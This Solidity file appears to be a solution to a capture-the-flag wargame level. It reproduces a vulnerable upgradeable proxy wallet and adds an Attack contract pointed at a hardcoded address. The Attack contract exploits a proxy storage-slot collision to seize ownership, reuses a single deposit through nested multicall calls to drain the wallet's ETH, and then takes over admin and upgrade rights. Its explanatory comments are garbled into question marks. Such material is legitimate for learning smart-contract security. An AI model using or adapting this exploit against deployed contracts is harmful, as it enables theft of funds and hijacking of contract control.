// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/proxy/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

contract Attack {
    PuzzleProxy target1 = PuzzleProxy(0x37B1CCA8C6e0017120c335963A6766cBD6e27BE8);
    PuzzleWallet target2 = PuzzleWallet(0x37B1CCA8C6e0017120c335963A6766cBD6e27BE8);

    function attack() payable public{
        target1.proposeNewAdmin(address(this));// ???????????????target2???owner
        target2.addToWhitelist(address(this));// ??????????????????????????????

        bytes memory depositData = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        bytes[] memory depositDatas = new bytes[](1);
        depositDatas[0] = depositData;

        bytes memory multicallData = abi.encodeWithSelector(PuzzleWallet.multicall.selector,depositDatas);
        bytes[] memory multicallDatas = new bytes[](2);
        multicallDatas[0] = multicallData;
        multicallDatas[1] = multicallData;

        bytes memory Data = abi.encodeWithSelector(PuzzleWallet.multicall.selector,multicallDatas);
        bytes[] memory Datas = new bytes[](1);
        Datas[0] = Data;

        target2.multicall{value:msg.value}(Datas);//???????????????????????????????????????????????????????????????ETH??????0.001??????????????????0.001?????????ETH????????????0.002???????????????????????????????????????0.002

        target2.execute(msg.sender, address(target2).balance, "");//??????????????????eth

        target2.setMaxBalance(uint256(address(this)));//???????????????admin

        target1.upgradeTo(msg.sender);// ?????????????????????
        target1.proposeNewAdmin(msg.sender);//?????????????????????admin
        target1.approveNewAdmin(msg.sender);
    }  
}   